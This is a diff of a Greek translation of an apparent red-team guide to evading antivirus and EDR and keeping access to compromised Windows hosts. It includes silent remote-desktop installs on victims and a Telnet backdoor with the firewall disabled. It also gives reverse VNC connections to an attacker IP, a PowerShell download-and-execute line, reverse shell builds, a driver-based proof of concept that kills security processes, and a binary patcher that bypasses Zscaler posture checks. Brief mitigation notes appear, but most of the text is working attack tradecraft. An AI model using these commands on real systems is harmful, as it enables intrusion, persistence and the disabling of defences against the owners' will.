-Αφορά την έγχυση του κακόβουλου κώδικα post-exploitation **στη δική του διαδικασία**. Με αυτόν τον τρόπο, μπορείτε να αποφύγετε τη δημιουργία νέας διαδικασίας και την σάρωση από το AV, αλλά το μειονέκτημα είναι ότι αν κάτι πάει στραβά με την εκτέλεση του payload σας, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να **χάσετε το beacon σας** καθώς μπορεί να καταρρεύσει.
+Αφορά την injection του post-exploitation malicious code **στην ίδια τη διεργασία**. Με αυτόν τον τρόπο, μπορείτε να αποφύγετε τη δημιουργία νέας διεργασίας και το σκανάρισμά της από το AV, αλλά το μειονέκτημα είναι ότι αν κάτι πάει στραβά με την εκτέλεση του payload σας, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να **χάσετε το beacon** καθώς μπορεί να καταρρεύσει.
 
 <figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>
 
 > [!TIP]
-> Αν θέλετε να διαβάσετε περισσότερα σχετικά με τη φόρτωση C# Assembly, παρακαλώ ελέγξτε αυτό το άρθρο [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) και το InlineExecute-Assembly BOF τους ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
+> Αν θέλετε να διαβάσετε περισσότερα για το C# Assembly loading, δείτε αυτό το άρθρο [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) και το InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
 
-Μπορείτε επίσης να φορτώσετε C# Assemblies **από το PowerShell**, ελέγξτε το [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) και το [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).
+Μπορείτε επίσης να φορτώσετε C# Assemblies **από PowerShell**, δείτε [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) και το [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).
 
-## Χρήση Άλλων Γλωσσών Προγραμματισμού
+## Using Other Programming Languages
 
-Όπως προτάθηκε στο [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), είναι δυνατό να εκτελέσετε κακόβουλο κώδικα χρησιμοποιώντας άλλες γλώσσες δίνοντας στη συμβιβασμένη μηχανή πρόσβαση **στο περιβάλλον διερμηνέα που είναι εγκατεστημένο στο SMB share που ελέγχεται από τον επιτιθέμενο**.
+Όπως προτείνεται στο [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), είναι δυνατό να εκτελέσετε malicious code χρησιμοποιώντας άλλες γλώσσες δίνοντας στη compromised machine πρόσβαση **στο interpreter environment εγκατεστημένο στο Attacker Controlled SMB share**.
 
-Επιτρέποντας την πρόσβαση στα Δυαδικά Αρχεία Διερμηνέα και το περιβάλλον στο SMB share μπορείτε να **εκτελέσετε αυθαίρετο κώδικα σε αυτές τις γλώσσες μέσα στη μνήμη** της συμβιβασμένης μηχανής.
+Επιτρέποντας πρόσβαση στα Interpreter Binaries και στο περιβάλλον στο SMB share μπορείτε να **εκτελέσετε arbitrary code σε αυτές τις γλώσσες εντός της μνήμης** της compromised machine.
 
-Το repo υποδεικνύει: Ο Defender εξακολουθεί να σαρώνει τα σενάρια αλλά χρησιμοποιώντας Go, Java, PHP κ.λπ. έχουμε **περισσότερη ευελιξία για να παρακάμψουμε τις στατικές υπογραφές**. Οι δοκιμές με τυχαία μη-αποκρυπτογραφημένα σενάρια reverse shell σε αυτές τις γλώσσες έχουν αποδειχθεί επιτυχείς.
+Το repo αναφέρει: Το Defender εξακολουθεί να σκανάρει τα scripts αλλά με τη χρήση Go, Java, PHP κ.λπ. έχουμε **περισσότερη ευελιξία για να παρακάμψουμε static signatures**. Δοκιμές με τυχαία μη-obfuscated reverse shell scripts σε αυτές τις γλώσσες απέδειξαν επιτυχία.
 
 ## TokenStomping
 
-Το Token stomping είναι μια τεχνική που επιτρέπει σε έναν επιτιθέμενο να **χειραγωγήσει το access token ή ένα προϊόν ασφαλείας όπως ένα EDR ή AV**, επιτρέποντάς τους να μειώσουν τα δικαιώματα του ώστε η διαδικασία να μην πεθάνει αλλά να μην έχει άδειες για να ελέγξει για κακόβουλες δραστηριότητες.
+Token stomping είναι μια τεχνική που επιτρέπει σε έναν attacker να **manipulate το access token ή ένα security product όπως ένα EDR ή AV**, επιτρέποντάς του να μειώσει τα privileges του έτσι ώστε η διεργασία να μην πεθαίνει αλλά να μην έχει τα δικαιώματα να ελέγξει για κακόβουλες δραστηριότητες.
 
-Για να το αποτρέψει αυτό, τα Windows θα μπορούσαν να **αποτρέψουν εξωτερικές διαδικασίες** από το να αποκτούν handles πάνω στα tokens των διαδικασιών ασφαλείας.
+Για να αποτραπεί αυτό, τα Windows θα μπορούσαν να **αποτρέπουν εξωτερικές διεργασίες** από το να παίρνουν handles πάνω στα tokens των διεργασιών ασφάλειας.
 
 - [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
 - [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
 - [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)
 
-## Χρήση Εμπιστευμένου Λογισμικού
+## Using Trusted Software
 
 ### Chrome Remote Desktop
 
-Όπως περιγράφεται σε [**αυτή την ανάρτηση στο blog**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), είναι εύκολο να αναπτύξετε το Chrome Remote Desktop σε έναν υπολογιστή θύματος και στη συνέχεια να το χρησιμοποιήσετε για να τον καταλάβετε και να διατηρήσετε την επιμονή:
-1. Κατεβάστε από https://remotedesktop.google.com/, κάντε κλικ στο "Set up via SSH", και στη συνέχεια κάντε κλικ στο αρχείο MSI για Windows για να κατεβάσετε το αρχείο MSI.
-2. Εκτελέστε τον εγκαταστάτη σιωπηλά στον θύμα (απαιτείται διαχειριστής): `msiexec /i chromeremotedesktophost.msi /qn`
-3. Επιστρέψτε στη σελίδα του Chrome Remote Desktop και κάντε κλικ στο επόμενο. Ο οδηγός θα σας ζητήσει να εξουσιοδοτήσετε; κάντε κλικ στο κουμπί Εξουσιοδότηση για να συνεχίσετε.
-4. Εκτελέστε την δεδομένη παράμετρο με κάποιες προσαρμογές: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Σημειώστε την παράμετρο pin που επιτρέπει να ορίσετε το pin χωρίς να χρησιμοποιήσετε το GUI).
+Όπως περιγράφεται σε [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), είναι εύκολο να αναπτύξετε απλά το Chrome Remote Desktop σε ένα θύμα και στη συνέχεια να το χρησιμοποιήσετε για takeover και διατήρηση persistence:
+1. Download από https://remotedesktop.google.com/, κάντε κλικ στο "Set up via SSH", και έπειτα κάντε κλικ στο MSI file for Windows για να κατεβάσετε το MSI.
+2. Εκτελέστε τον installer σιωπηλά στο θύμα (απαιτείται admin): `msiexec /i chromeremotedesktophost.msi /qn`
+3. Επιστρέψτε στη σελίδα Chrome Remote Desktop και κάντε κλικ στο next. Ο wizard θα σας ζητήσει να authorize· πατήστε το Authorize για να συνεχίσετε.
+4. Εκτελέστε την παρασχεθείσα παράμετρο με κάποιες προσαρμογές: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Σημειώστε την παράμετρο pin που επιτρέπει τη ρύθμιση του pin χωρίς χρήση του GUI).
 
-## Προχωρημένη Απόκρυψη
+## Advanced Evasion
 
-Η απόκρυψη είναι ένα πολύ περίπλοκο θέμα, μερικές φορές πρέπει να λάβετε υπόψη πολλές διαφορετικές πηγές τηλεμετρίας σε ένα μόνο σύστημα, οπότε είναι σχεδόν αδύνατο να παραμείνετε εντελώς αόρατοι σε ώριμα περιβάλλοντα.
+Το evasion είναι ένα πολύ περίπλοκο θέμα, μερικές φορές πρέπει να λάβετε υπόψη πολλές διαφορετικές πηγές telemetry σε ένα μόνο σύστημα, οπότε είναι σχεδόν αδύνατο να παραμείνετε εντελώς αόρατοι σε ώριμα περιβάλλοντα.
 
-Κάθε περιβάλλον που αντιμετωπίζετε θα έχει τα δικά του πλεονεκτήματα και αδυναμίες.
+Κάθε περιβάλλον που αντιμετωπίζετε θα έχει τα δικά του δυνατά και αδύναμα σημεία.
 
-Σας προτείνω να παρακολουθήσετε αυτή την ομιλία από τον [@ATTL4S](https://twitter.com/DaniLJ94), για να αποκτήσετε μια βάση σε πιο προχωρημένες τεχνικές απόκρυψης.
+Σας προτρέπω έντονα να παρακολουθήσετε αυτή την ομιλία από [@ATTL4S](https://twitter.com/DaniLJ94), για να αποκτήσετε ένα foothold στις πιο Advanced Evasion τεχνικές.
+
 
 {{#ref}}
 https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
 {{#endref}}
 
-Αυτή είναι επίσης μια άλλη εξαιρετική ομιλία από τον [@mariuszbit](https://twitter.com/mariuszbit) σχετικά με την Απόκρυψη σε Βάθος.
+This is also another great talk from [@mariuszbit](https://twitter.com/mariuszbit) about Evasion in Depth.
+
 
 {{#ref}}
 https://www.youtube.com/watch?v=IbA7Ung39o4
 {{#endref}}
 
-## **Παλαιές Τεχνικές**
+## **Old Techniques**
 
-### **Ελέγξτε ποιες περιοχές βρίσκει ο Defender ως κακόβουλες**
+### **Check which parts Defender finds as malicious**
 
-Μπορείτε να χρησιμοποιήσετε [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) που θα **αφαιρέσει μέρη του δυαδικού αρχείου** μέχρι να **ανακαλύψει ποιο μέρος βρίσκει ο Defender** ως κακόβουλο και να το διαχωρίσει για εσάς.\
-Ένα άλλο εργαλείο που κάνει **το ίδιο πράγμα είναι** [**avred**](https://github.com/dobin/avred) με μια ανοιχτή ιστοσελίδα που προσφέρει την υπηρεσία στο [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)
+Μπορείτε να χρησιμοποιήσετε το [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) που θα **remove parts of the binary** μέχρι να **βρει ποιο μέρος το Defender** θεωρεί κακόβουλο και να σας το απομονώσει.\
+Ένα άλλο εργαλείο που κάνει **το ίδιο** είναι το [**avred**](https://github.com/dobin/avred) με μια ανοιχτή web υπηρεσία στο [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)
 
 ### **Telnet Server**
 
-Μέχρι τα Windows 10, όλα τα Windows έρχονταν με έναν **Telnet server** που μπορούσατε να εγκαταστήσετε (ως διαχειριστής) κάνοντας:
+Μέχρι τα Windows10, όλα τα Windows περιείχαν έναν **Telnet server** που μπορούσατε να εγκαταστήσετε (ως administrator) κάνοντας:
 ```bash
 pkgmgr /iu:"TelnetServer" /quiet
 ```
-Κάντε το **να ξεκινά** όταν εκκινείται το σύστημα και **τρέξτε** το τώρα:
+Κάνε το να **ξεκινά** όταν το σύστημα ξεκινά και **τρέξε** το τώρα:
 ```bash
 sc config TlntSVR start= auto obj= localsystem
 ```
-**Αλλαγή θύρας telnet** (stealth) και απενεργοποίηση του τείχους προστασίας:
+**Αλλαγή telnet port** (κρυφά) και απενεργοποίηση firewall:
 ```
 tlntadmn config port=80
 netsh advfirewall set allprofiles state off
 ```
 ### UltraVNC
 
-Κατεβάστε το από: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (θέλετε τις λήψεις bin, όχι την εγκατάσταση)
+Κατεβάστε το από: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (you want the bin downloads, not the setup)
 
-**ΣΤΟΝ HOST**: Εκτελέστε το _**winvnc.exe**_ και ρυθμίστε τον διακομιστή:
+**ON THE HOST**: Εκτελέστε _**winvnc.exe**_ και διαμορφώστε τον server:
 
 - Ενεργοποιήστε την επιλογή _Disable TrayIcon_
-- Ορίστε έναν κωδικό πρόσβασης στο _VNC Password_
-- Ορίστε έναν κωδικό πρόσβασης στο _View-Only Password_
+- Ορίστε κωδικό στο _VNC Password_
+- Ορίστε κωδικό στο _View-Only Password_
 
-Στη συνέχεια, μεταφέρετε το δυαδικό _**winvnc.exe**_ και το **νέο** αρχείο _**UltraVNC.ini**_ μέσα στον **θύμα**
+Στη συνέχεια, μετακινήστε το binary _**winvnc.exe**_ και το **πρόσφατα** δημιουργημένο αρχείο _**UltraVNC.ini**_ μέσα στο **victim**
 
-#### **Αντίστροφη σύνδεση**
+#### **Reverse connection**
 
-Ο **επιτιθέμενος** θα πρέπει να **εκτελέσει μέσα** στον **host** του το δυαδικό `vncviewer.exe -listen 5900` ώστε να είναι **έτοιμος** να πιάσει μια αντίστροφη **VNC σύνδεση**. Στη συνέχεια, μέσα στον **θύμα**: Ξεκινήστε τον δαίμονα winvnc `winvnc.exe -run` και εκτελέστε `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`
+Ο **attacker** θα πρέπει να **εκτελέσει μέσα** στο **host** το binary `vncviewer.exe -listen 5900` ώστε να είναι **έτοιμο** να πιάσει μια reverse **VNC connection**. Στη συνέχεια, μέσα στο **victim**: Εκκινήστε το winvnc daemon `winvnc.exe -run` και τρέξτε `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`
 
-**ΠΡΟΕΙΔΟΠΟΙΗΣΗ:** Για να διατηρήσετε την κρυψίνοια δεν πρέπει να κάνετε μερικά πράγματα
+**WARNING:** Για να διατηρήσετε τη διακριτικότητα, μην κάνετε τα εξής
 
-- Μην ξεκινήσετε το `winvnc` αν είναι ήδη σε εκτέλεση ή θα προκαλέσετε ένα [popup](https://i.imgur.com/1SROTTl.png). ελέγξτε αν είναι σε εκτέλεση με `tasklist | findstr winvnc`
-- Μην ξεκινήσετε το `winvnc` χωρίς το `UltraVNC.ini` στον ίδιο φάκελο ή θα προκαλέσει το [παράθυρο ρύθμισης](https://i.imgur.com/rfMQWcf.png) να ανοίξει
-- Μην εκτελέσετε το `winvnc -h` για βοήθεια ή θα προκαλέσετε ένα [popup](https://i.imgur.com/oc18wcu.png)
+- Μην ξεκινήσετε το `winvnc` αν τρέχει ήδη ή θα ενεργοποιήσετε ένα [popup](https://i.imgur.com/1SROTTl.png). Ελέγξτε αν τρέχει με `tasklist | findstr winvnc`
+- Μην ξεκινήσετε το `winvnc` χωρίς `UltraVNC.ini` στον ίδιο φάκελο ή θα ανοίξει [το config window](https://i.imgur.com/rfMQWcf.png)
+- Μην τρέξετε `winvnc -h` για βοήθεια γιατί θα ενεργοποιήσετε ένα [popup](https://i.imgur.com/oc18wcu.png)
 
 ### GreatSCT
 
@@ -467,19 +473,19 @@ sel lport 4444
 generate #payload is the default name
 #This will generate a meterpreter xml and a rcc file for msfconsole
 ```
-Τώρα **ξεκινήστε τον καταχωρητή** με `msfconsole -r file.rc` και **εκτελέστε** το **xml payload** με:
+Τώρα **ξεκινήστε τον lister** με `msfconsole -r file.rc` και **εκτελέστε** το **xml payload** με:
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
 ```
-**Ο τρέχων αμυντικός θα τερματίσει τη διαδικασία πολύ γρήγορα.**
+**Ο τρέχων defender θα τερματίσει τη process πολύ γρήγορα.**
 
-### Συγκέντρωση του δικού μας reverse shell
+### Μεταγλώττιση του δικού μας reverse shell
 
 https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15
 
 #### Πρώτο C# Revershell
 
-Συγκεντρώστε το με:
+Μεταγλωττίστε το με:
 ```
 c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
 ```
@@ -560,10 +566,14 @@ catch (Exception err) { }
 }
 }
 ```
-### C# χρησιμοποιώντας μεταγλωττιστή
+### C# χρήση compiler
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
 ```
+[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)
+
+[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)
+
 Αυτόματη λήψη και εκτέλεση:
 ```csharp
 64bit:
@@ -576,7 +586,7 @@ powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.g
 https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
 {{#endref}}
 
-Λίστα αποσυμπιεστών C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)
+Λίστα obfuscators για C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)
 
 ### C++
 ```
@@ -591,7 +601,7 @@ i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sec
 - [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
 - [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)
 
-### Χρησιμοποιώντας python για παράδειγμα κατασκευής ενέσεων:
+### Παράδειγμα χρήσης python για δημιουργία injectors:
 
 - [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)
 
@@ -620,30 +630,30 @@ https://github.com/TheWover/donut
 # Vulcan
 https://github.com/praetorian-code/vulcan
 ```
-### Περισσότερα
+### More
 
 - [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)
 
-## Φέρτε τον Δικό σας Ευάλωτο Οδηγό (BYOVD) – Σκοτώνοντας AV/EDR Από τον Χώρο Πυρήνα
+## Bring Your Own Vulnerable Driver (BYOVD) – Απενεργοποίηση AV/EDR από τον χώρο του kernel
 
-Ο Storm-2603 χρησιμοποίησε ένα μικρό κονσόλα utility γνωστό ως **Antivirus Terminator** για να απενεργοποιήσει τις προστασίες του endpoint πριν ρίξει ransomware. Το εργαλείο φέρνει τον **δικό του ευάλωτο αλλά *υπογεγραμμένο* οδηγό** και τον κακοποιεί για να εκδώσει προνομιακές λειτουργίες πυρήνα που ακόμη και οι υπηρεσίες AV Protected-Process-Light (PPL) δεν μπορούν να μπλοκάρουν.
+Το Storm-2603 αξιοποίησε ένα μικρό βοηθητικό κονσόλας γνωστό ως **Antivirus Terminator** για να απενεργοποιήσει τις endpoint προστασίες πριν αφήσει ransomware. Το εργαλείο φέρνει τον **δικό του ευάλωτο αλλά *signed* driver** και τον καταχράται για να εκτελέσει προνομιούχες λειτουργίες kernel που ακόμη και οι υπηρεσίες AV Protected-Process-Light (PPL) δεν μπορούν να μπλοκάρουν.
 
-Βασικά σημεία
-1. **Υπογεγραμμένος οδηγός**: Το αρχείο που παραδίδεται στο δίσκο είναι το `ServiceMouse.sys`, αλλά το δυαδικό είναι ο νόμιμα υπογεγραμμένος οδηγός `AToolsKrnl64.sys` από το “System In-Depth Analysis Toolkit” της Antiy Labs. Επειδή ο οδηγός φέρει έγκυρη υπογραφή της Microsoft, φορτώνεται ακόμη και όταν η Επιβολή Υπογραφής Οδηγών (DSE) είναι ενεργοποιημένη.
-2. **Εγκατάσταση υπηρεσίας**:
+Κύρια σημεία
+1. **Signed driver**: Το αρχείο που γράφεται στο δίσκο είναι `ServiceMouse.sys`, αλλά το binary είναι ο νόμιμα υπογεγραμμένος driver `AToolsKrnl64.sys` από το Antiy Labs’ “System In-Depth Analysis Toolkit”. Εφόσον ο driver φέρει έγκυρη υπογραφή Microsoft, φορτώνεται ακόμη και όταν το Driver-Signature-Enforcement (DSE) είναι ενεργοποιημένο.
+2. **Service installation**:
 ```powershell
 sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
 sc start  ServiceMouse
 ```
-Η πρώτη γραμμή καταχωρεί τον οδηγό ως **υπηρεσία πυρήνα** και η δεύτερη τον ξεκινά ώστε το `\\.\ServiceMouse` να γίνει προσβάσιμο από το user land.
-3. **IOCTLs που εκτίθενται από τον οδηγό**
-| Κωδικός IOCTL | Δυνατότητα                              |
+Η πρώτη γραμμή καταχωρεί τον driver ως **kernel service** και η δεύτερη τον εκκινεί ώστε το `\\.\ServiceMouse` να γίνει προσβάσιμο από το user land.
+3. **IOCTLs exposed by the driver**
+| IOCTL code | Capability                              |
 |-----------:|-----------------------------------------|
-| `0x99000050` | Τερματισμός μιας αυθαίρετης διαδικασίας κατά PID (χρησιμοποιείται για να σκοτώσει τις υπηρεσίες Defender/EDR) |
-| `0x990000D0` | Διαγραφή μιας αυθαίρετης αρχείου στο δίσκο |
-| `0x990001D0` | Αφαίρεση του οδηγού και διαγραφή της υπηρεσίας |
+| `0x99000050` | Τερματίζει μια αυθαίρετη διεργασία κατά PID (χρησιμοποιείται για να σκοτώσει υπηρεσίες Defender/EDR) |
+| `0x990000D0` | Διαγράφει αυθαίρετο αρχείο από τον δίσκο |
+| `0x990001D0` | Απεγκαθιστά τον driver και αφαιρεί την υπηρεσία |
 
-Ελάχιστο C proof-of-concept:
+Minimal C proof-of-concept:
 ```c
 #include <windows.h>
 
@@ -655,30 +665,30 @@ CloseHandle(hDrv);
 return 0;
 }
 ```
-4. **Γιατί λειτουργεί**:  Ο BYOVD παρακάμπτει εντελώς τις προστασίες του user-mode; ο κώδικας που εκτελείται στον πυρήνα μπορεί να ανοίξει *προστατευμένες* διαδικασίες, να τις τερματίσει ή να παρέμβει σε αντικείμενα πυρήνα ανεξαρτήτως PPL/PP, ELAM ή άλλων χαρακτηριστικών σκληρύνσης.
+4. **Γιατί λειτουργεί**: Το BYOVD παρακάμπτει εντελώς τις user-mode προστασίες· κώδικας που εκτελείται στον kernel μπορεί να ανοίξει *protected* διεργασίες, να τις τερματίσει ή να παραποιήσει αντικείμενα του kernel ανεξάρτητα από PPL/PP, ELAM ή άλλα hardening features.
 
-Ανίχνευση / Μετριασμός
-•  Ενεργοποιήστε τη λίστα αποκλεισμού ευάλωτων οδηγών της Microsoft (`HVCI`, `Smart App Control`) ώστε τα Windows να αρνούνται να φορτώσουν το `AToolsKrnl64.sys`.
-•  Παρακολουθήστε τη δημιουργία νέων *υπηρεσιών* πυρήνα και ειδοποιήστε όταν ένας οδηγός φορτώνεται από έναν κατάλογο που μπορεί να γραφτεί από τον κόσμο ή δεν είναι παρών στη λίστα επιτρεπόμενων.
-•  Παρακολουθήστε για handles user-mode σε προσαρμοσμένα αντικείμενα συσκευών που ακολουθούνται από ύποπτες κλήσεις `DeviceIoControl`.
+Ανίχνευση / Αντιμετώπιση
+•  Ενεργοποιήστε τη λίστα αποκλεισμού ευάλωτων drivers της Microsoft (`HVCI`, `Smart App Control`) ώστε τα Windows να αρνούνται να φορτώσουν το `AToolsKrnl64.sys`.  
+•  Παρακολουθείτε τη δημιουργία νέων *kernel* υπηρεσιών και ειδοποιήστε όταν ένας driver φορτώνεται από κατάλογο με δικαιώματα εγγραφής για όλους ή όταν δεν υπάρχει στη λίστα επιτρεπτών.  
+•  Επιβλέπετε για user-mode handles προς custom device objects και ύποπτες κλήσεις `DeviceIoControl` στη συνέχεια.
 
-### Παράκαμψη Ελέγχων Θέσης του Zscaler Client Connector μέσω Διόρθωσης Δυαδικών Αρχείων στον Δίσκο
+### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching
 
-Ο **Client Connector** της Zscaler εφαρμόζει κανόνες θέσης συσκευής τοπικά και βασίζεται σε Windows RPC για να επικοινωνήσει τα αποτελέσματα σε άλλα συστατικά. Δύο αδύναμες σχεδιαστικές επιλογές καθιστούν δυνατή μια πλήρη παράκαμψη:
+Το **Client Connector** της Zscaler εφαρμόζει τοπικά κανόνες device-posture και βασίζεται στο Windows RPC για να μεταφέρει τα αποτελέσματα σε άλλα συστατικά. Δύο αδύναμες σχεδιαστικές επιλογές επιτρέπουν πλήρη bypass:
 
-1. Η αξιολόγηση θέσης συμβαίνει **εντελώς από την πλευρά του πελάτη** (ένα boolean αποστέλλεται στον διακομιστή).
-2. Οι εσωτερικές τελικές RPC επικυρώνουν μόνο ότι το εκτελέσιμο που συνδέεται είναι **υπογεγραμμένο από την Zscaler** (μέσω `WinVerifyTrust`).
+1. Η αξιολόγηση posture γίνεται **πλήρως client-side** (στέλνεται απλά ένα boolean στον server).  
+2. Τα εσωτερικά RPC endpoints επαληθεύουν μόνο ότι το εκτελέσιμο που συνδέεται είναι **υπογεγραμμένο από τη Zscaler** (μέσω `WinVerifyTrust`).
 
-Με **διόρθωση τεσσάρων υπογεγραμμένων δυαδικών αρχείων στον δίσκο** και οι δύο μηχανισμοί μπορούν να εξουδετερωθούν:
+Με το **patching τεσσάρων υπογεγραμμένων δυαδικών αρχείων στον δίσκο** και οι δύο μηχανισμοί μπορούν να εξουδετερωθούν:
 
-| Δυαδικό | Αρχική λογική που διορθώθηκε | Αποτέλεσμα |
+| Binary | Original logic patched | Result |
 |--------|------------------------|---------|
-| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Πάντα επιστρέφει `1` ώστε κάθε έλεγχος να είναι συμμορφωμένος |
-| `ZSAService.exe` | Έμμεση κλήση στο `WinVerifyTrust` | NOP-ed ⇒ οποιαδήποτε (ακόμη και μη υπογεγραμμένη) διαδικασία μπορεί να συνδεθεί στους σωλήνες RPC |
-| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Αντικαταστάθηκε από `mov eax,1 ; ret` |
-| `ZSATunnel.exe` | Έλεγχοι ακεραιότητας στον σωλήνα | Συντομευμένοι | 
+| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Επιστρέφει πάντα `1`, οπότε κάθε έλεγχος θεωρείται compliant |
+| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ οποιαδήποτε (ακόμη και unsigned) διεργασία μπορεί να bind-άρει στις RPC pipes |
+| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Replaced by `mov eax,1 ; ret` |
+| `ZSATunnel.exe` | Integrity checks on the tunnel | Παρακάμφθηκαν |
 
-Ελάχιστο απόσπασμα διορθωτή:
+Ελάχιστο απόσπασμα του patcher:
 ```python
 pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
 replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1
@@ -692,18 +702,93 @@ else:
 f.seek(off)
 f.write(replacement)
 ```
-Μετά την αντικατάσταση των αρχικών αρχείων και την επανεκκίνηση της στοίβας υπηρεσιών:
+Μετά την αντικατάσταση των αρχικών αρχείων και την επανεκκίνηση του service stack:
 
-* **Όλοι** οι έλεγχοι στάσης εμφανίζουν **πράσινο/συμβατό**.
-* Μη υπογεγραμμένα ή τροποποιημένα δυαδικά αρχεία μπορούν να ανοίξουν τα ονόματα-σωλήνες RPC (π.χ. `\\RPC Control\\ZSATrayManager_talk_to_me`).
-* Ο παραβιασμένος υπολογιστής αποκτά απεριόριστη πρόσβαση στο εσωτερικό δίκτυο που ορίζεται από τις πολιτικές Zscaler.
+* **Όλοι** οι έλεγχοι κατάστασης (posture checks) εμφανίζονται **πράσινοι/συμμορφούμενοι**.
+* Μη υπογεγραμμένα ή τροποποιημένα binaries μπορούν να ανοίξουν τα named-pipe RPC endpoints (π.χ. `\\RPC Control\\ZSATrayManager_talk_to_me`).
+* Το συμβιβασμένο host αποκτά απεριόριστη πρόσβαση στο εσωτερικό δίκτυο που ορίζεται από τις πολιτικές της Zscaler.
 
-Αυτή η μελέτη περίπτωσης δείχνει πώς οι αποφάσεις εμπιστοσύνης που βασίζονται αποκλειστικά στον πελάτη και οι απλοί έλεγχοι υπογραφής μπορούν να παρακαμφθούν με μερικές τροποποιήσεις byte.
+Αυτή η μελέτη περίπτωσης δείχνει πώς αποκλειστικά αποφάσεις εμπιστοσύνης στην πλευρά του client και απλοί έλεγχοι υπογραφής μπορούν να παρακαμφθούν με μερικά byte patches.
 
-## Αναφορές
+## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs
+
+Protected Process Light (PPL) επιβάλλει μια ιεραρχία signer/level ώστε μόνο προστατευμένες διεργασίες ίσου ή ανώτερου επιπέδου να μπορούν να παρεμβαίνουν η μία στην άλλη. Επιθετικά, αν μπορείτε νόμιμα να εκκινήσετε ένα PPL-enabled binary και να ελέγξετε τα arguments του, μπορείτε να μετατρέψετε μια ανώδυνη λειτουργία (π.χ., logging) σε ένα περιορισμένο, PPL-backed write primitive κατά των προστατευμένων καταλόγων που χρησιμοποιούνται από AV/EDR.
+
+Τι κάνει μια διαδικασία να τρέχει ως PPL
+- Το στοχευόμενο EXE (και τυχόν φορτωμένα DLLs) πρέπει να είναι υπογεγραμμένο με ένα PPL-capable EKU.
